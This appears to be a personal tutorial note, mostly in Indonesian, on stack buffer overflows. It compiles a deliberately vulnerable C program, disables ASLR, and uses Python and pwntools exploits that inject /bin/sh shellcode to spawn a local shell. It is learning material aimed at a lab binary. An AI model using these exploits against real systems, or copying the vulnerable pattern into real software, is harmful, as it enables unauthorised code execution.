# 6 - shellcode and pwntools

## install pwntools
- install di python3
```bash
python3 -m venv venv
source venv/bin/activate
python3 -m pip install --upgrade pwntools
```

- test assemble and disassemble program
```py
from pwn import *

context(arch='amd64', os='linux')
kode='mov eax, 0x1'
print(asm(kode))

kode='''
mov eax, 0x1
mov ebx, 0x0
int 0x80
'''
# asm
print(asm(kode))

# disasm
print(disasm(b"\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80"))

```

## buat program vuln nya buat tes shellcode
```c
#include <stdio.h>
#include <unistd.h>

int main(){
    char buffer[64];
    printf("Buffer ada di: %p\n", &buffer);
    fflush(stdout);
    read(0, &buffer, 128);
    return 0;
}

// compile in m32
// gcc -no-pie -fno-pic -fno-stack-protector -fno-builtin -mpreferred-stack-boundary=2 -m32 -z execstack shellcode_test.c -o shellcode_test

//  kalau error, misal gini : [-Wstringop-overflow=]
// kasih jadi -Wno -> -Wno-stringop-overflow
// gcc -no-pie -fno-pic -fno-stack-protector -fno-builtin -mpreferred-stack-boundary=2 -m32 -z execstack shellcode_test.c -o shellcode_test -Wno-stringop-overflow
```

## teori kematian about code
- kita kan punya kontrol ke isi buffer dan ke ret addr
- gimana cara kita bisa menjalankan sembarang instruksi yg ga ada di code programnya
- contoh kita bikin buffer nya begini
```c
mov eax, 0x1
mov ebx, 0x0
int 0x80
```
- lalu, ret addr kita arahkan ke perintah barusan (di arahkan ke alamat buffer)
- kalau biasanya kita isi buffernya pakai sembarang sampah (A * 16 misal), sekarang di isi ama machine code 
- misal :
```go
\xb8 \x01 \x00 \x00
\x00 \xbb \x00 \x00
\x00 \x00 \xcd \x80
```
- terus, kan menuhin buffer, sekarang di ret addr dari buffernya
- nah disini mau buat custom machine code nya jadi shell, itu lah shellcode
- alamat buffer harus persis, itu susah kalau ada aslr (random offset)
- dan stack harus executable, os yg modern stack nya ga executable avoid shellcode
- disable nx di binary nya, biar shellcode nya bisa
- itulah kenapa di code ada ini :
```c
printf("Buffer ada di: %p\n", &buffer);
```
- kalau gada itu susah, harus nebak


## compile and run
```bash
gcc -no-pie -fno-pic -fno-stack-protector -fno-builtin -mpreferred-stack-boundary=2 -m32 -z execstack shellcode_test.c -o shellcode_test -Wno-stringop-overflow
```
### hasil 
```bash
./shellcode_test
Buffer ada di: 0xffd31dd8

./shellcode_test
Buffer ada di: 0xffb7e5a8

./shellcode_test
Buffer ada di: 0xffd56208
```

### teori kematian about binary nya
- addr / alamat nya beda2 karna aslr, bakal sulit buat loncat kemana (tiap run beda2)
- buat belajar harus disable aslr nya :
```bash
sudo su
echo "0" > /proc/sys/kernel/randomize_va_space
```
- buat nyalainnya lagi
```bash
sudo su
echo "1" > /proc/sys/kernel/randomize_va_space # atau dia juga bisa aktif lagi kalau computer restart
```
- after disable aslr :
```bash
./shellcode_test
Buffer ada di: 0xffffb818

./shellcode_test
Buffer ada di: 0xffffb818

./shellcode_test
Buffer ada di: 0xffffb818
```

- layout:
```bash
shellcode -> padding / junk -> ret addr (alamat buffer shellcode)
```

### memilih shellcode :
- misal gini 
```bash
uname -a
Linux kali 6.6.9-amd64 SMP PREEMPT_DYNAMIC Kali 6.6.9-1kali1 (2024-01-08) x86_64 GNU/Linux
file shellcode_test
shellcode_test: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV),
```
- ambil yang linux x86 tanpa 64 karna binary nya 32: [disini](https://shell-storm.org/shellcode/files/shellcode-752.html)
- alamat stack di run as shell sama di debugger bisa beda juga
```bash
pwndbg> r
Starting program: /home/tomba/binex/shellcode_test 
warning: Unable to find libthread_db matching inferiors thread library, thread debugging will not be available.
Buffer ada di: 0xffffb698 // di debugger
exit
[Inferior 1 (process 20207) exited normally]
pwndbg> exit
./shellcode_test
Buffer ada di: 0xffffb818 // luar debugger
```


## analyze func
```c
pwndbg> disas main
Dump of assembler code for function main:
   0x08049186 <+0>:	push   ebp
   0x08049187 <+1>:	mov    ebp,esp
   0x08049189 <+3>:	sub    esp,0x40
   0x0804918c <+6>:	lea    eax,[ebp-0x40]
   0x0804918f <+9>:	push   eax
   0x08049190 <+10>:	push   0x804a008
   0x08049195 <+15>:	call   0x8049050 <printf@plt>
   0x0804919a <+20>:	add    esp,0x8
   0x0804919d <+23>:	mov    eax,ds:0x804c018
   0x080491a2 <+28>:	push   eax
   0x080491a3 <+29>:	call   0x8049060 <fflush@plt>
   0x080491a8 <+34>:	add    esp,0x4
   0x080491ab <+37>:	push   0x80
   0x080491b0 <+42>:	lea    eax,[ebp-0x40] // ini
   0x080491b3 <+45>:	push   eax
   0x080491b4 <+46>:	push   0x0
   0x080491b6 <+48>:	call   0x8049040 <read@plt>
   0x080491bb <+53>:	add    esp,0xc
   0x080491be <+56>:	mov    eax,0x0
   0x080491c3 <+61>:	leave
   0x080491c4 <+62>:	ret
End of assembler dump.
```
- 0x080491b0 <+42>:	lea  eax,[ebp-0x40] 
> 64 byte + 4 byte saved ebp = 68 byte
- buat ngecek bisa pakai shellcode apa ga 
```c
pwndbg> checksec
File:     /home/tomba/binex/shellcode_test
Arch:     i386
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing // nx unknown
PIE:        No PIE (0x8048000)
Stack:      Executable
RWX:        Has RWX segments
Stripped:   No
```
- nyari offset aja kalau mau gampang
```c
pwndbg> cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
> output: Invalid address 0x61616172
pwndbg> cyclic -l 0x61616172
Finding cyclic pattern of 4 bytes: b'raaa' (hex: 0x72616161)
Found at offset 68
> offset ada 68
```

## exploit with custom code
- exploit pakai code sendiri, disini python2 soalnya ga ribet soal data type
```py
import struct
offset = 68
buff = 0xffffb698
buff_byte = struct.pack("<I", buff)
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
sc_len = len(shellcode)
payload = shellcode + "A" * (offset - sc_len) + buff_byte
print payload
```
- langsung run
```bash
python3 pelod.py > pelod.txt
```
- jump ke ret, and run as pelod output
```c
pwndbg> disas main
Dump of assembler code for function main:
   0x08049186 <+0>:	push   ebp
   0x08049187 <+1>:	mov    ebp,esp
   0x08049189 <+3>:	sub    esp,0x40
   0x0804918c <+6>:	lea    eax,[ebp-0x40]
   0x0804918f <+9>:	push   eax
   0x08049190 <+10>:	push   0x804a008
   0x08049195 <+15>:	call   0x8049050 <printf@plt>
   0x0804919a <+20>:	add    esp,0x8
   0x0804919d <+23>:	mov    eax,ds:0x804c018
   0x080491a2 <+28>:	push   eax
   0x080491a3 <+29>:	call   0x8049060 <fflush@plt>
   0x080491a8 <+34>:	add    esp,0x4
   0x080491ab <+37>:	push   0x80
   0x080491b0 <+42>:	lea    eax,[ebp-0x40]
   0x080491b3 <+45>:	push   eax
   0x080491b4 <+46>:	push   0x0
   0x080491b6 <+48>:	call   0x8049040 <read@plt>
   0x080491bb <+53>:	add    esp,0xc
   0x080491be <+56>:	mov    eax,0x0
   0x080491c3 <+61>:	leave
   0x080491c4 <+62>:	ret
End of assembler dump.
pwndbg> break *main+62
Breakpoint 1 at 0x80491c4
pwndbg> r < pelod.txt
00:0000│ esp 0xffffb6dc —▸ 0xffffb698 ◂— 0xe1f7c931 // top of stacknya
01:0004│     0xffffb6e0 ◂— 0xa /* '\n' */
02:0008│     0xffffb6e4 —▸ 0xffffb794 —▸ 0xffffb99b ◂— '/home/tomba/binex/shellcode_test'
03:000c│     0xffffb6e8 —▸ 0xffffb79c —▸ 0xffffb9bc ◂— 'POWERSHELL_TELEMETRY_OPTOUT=1'
04:0010│     0xffffb6ec —▸ 0xffffb700 —▸ 0xf7e32e14 ◂— 0x232d0c /* '\x0c-#' */
05:0014│     0xffffb6f0 —▸ 0xf7e32e14 ◂— 0x232d0c /* '\x0c-#' */
06:0018│     0xffffb6f4 —▸ 0x804909d (_start+45) ◂— jmp main
07:001c│     0xffffb6f8 ◂— 1
```
- top of stack sama buff = 0xffffb698, esp 0xffffb6dc —▸ 0xffffb698
- baca di addr itu as machine code
```c 
pwndbg> x/10wx 0xffffb698
0xffffb698:	0xe1f7c931	0x2f2f6851	0x2f686873	0x896e6962
0xffffb6a8:	0xcd0bb0e3	0x41414180	0x41414141	0x41414141
0xffffb6b8:	0x41414141	0x41414141
pwndbg> x/10i 0xffffb698
   0xffffb698:	xor    ecx,ecx
   0xffffb69a:	mul    ecx
   0xffffb69c:	push   ecx
   0xffffb69d:	push   0x68732f2f
   0xffffb6a2:	push   0x6e69622f
   0xffffb6a7:	mov    ebx,esp
   0xffffb6a9:	mov    al,0xb
   0xffffb6ab:	int    0x80
   0xffffb6ad:	inc    ecx
   0xffffb6ae:	inc    ecx
pwndbg> ni 
b+ 0x80491c4  <main+62>    ret                                <0xffffb698>
    ↓
 ► 0xffffb698              xor    ecx, ecx              ECX => 0
   0xffffb69a              mul    ecx
   0xffffb69c              push   ecx
   0xffffb69d              push   0x68732f2f
   0xffffb6a2              push   0x6e69622f
   0xffffb6a7              mov    ebx, esp              EBX => 0xffffb6d4 ◂— '/bin//sh'
   0xffffb6a9              mov    al, 0xb               AL => 0xb
   0xffffb6ab              int    0x80 <SYS_execve>
   0xffffb6ad              inc    ecx
   0xffffb6ae              inc    ecx
```
- keliatan sih, tapi coba dari luar debugging nya aja
- diluar debugging addr buffer nya beda, 0xffffb818
- jadi ganti aja payload py nya: buff = 0xffffb818
```bash
(python2 pelod.py; cat -) | ./shellcode_test
Buffer ada di: 0xffffb818
whoami
tomba
```
- case: aslr nonaktif, addr buffernya dikasih tau di printf


## new case - ASLR aktif tapi dikasih tau
- new case aslr aktif (alamat buffer bakal beda2), tapi dkasih tau
```bash
(python2 pelod.py; cat -) | ./shellcode_test
Buffer ada di: 0xffa21118
ls
[1]    38930 done                ( python2 pelod.py; /usr/bin/batcat -; ) | 
       38931 segmentation fault  ./shellcode_test
```
- buff = 0xffffb818 # alamat yg dicetak program
- ubah2 code nya, btw disini pip package pwntools gabisa run as python2
- jadi ubah ke python3, ribet juga lama kalau ke py2
```py
from pwn import *
import struct
context(arch='i386', os='linux')
p = process('./shellcode_test')
p.recvuntil(b"Buffer ada di: ")
buff = int(p.recvline().strip(), 16)
print("[+] addr buffer nya noh: ", hex(buff))
offset = 68
buff_byte = struct.pack("<I", buff)
shellcode = (
    b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f"
    b"\x73\x68\x68\x2f\x62\x69\x6e"
    b"\x89\xe3\xb0\x0b\xcd\x80"
)
payload = shellcode + b"A" * (offset - len(shellcode)) + buff_byte
print("[+] kirim pelod noh: ", payload)
p.sendline(payload)
print("[+] dapet shell noh")
p.interactive()
```
- and run
```bash
python3 pelod.py
[+] Starting local process './shellcode_test': pid 51512
[+] addr buffer nya noh:  0xff86cad8
[+] kirim pelod noh:  b'1\xc9\xf7\xe1Qh//shh/bin\x89\xe3\xb0\x0b\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xd8\xca\x86\xff'
[+] dapet shell noh
[*] Switching to interactive mode
$ whoami
tomba
```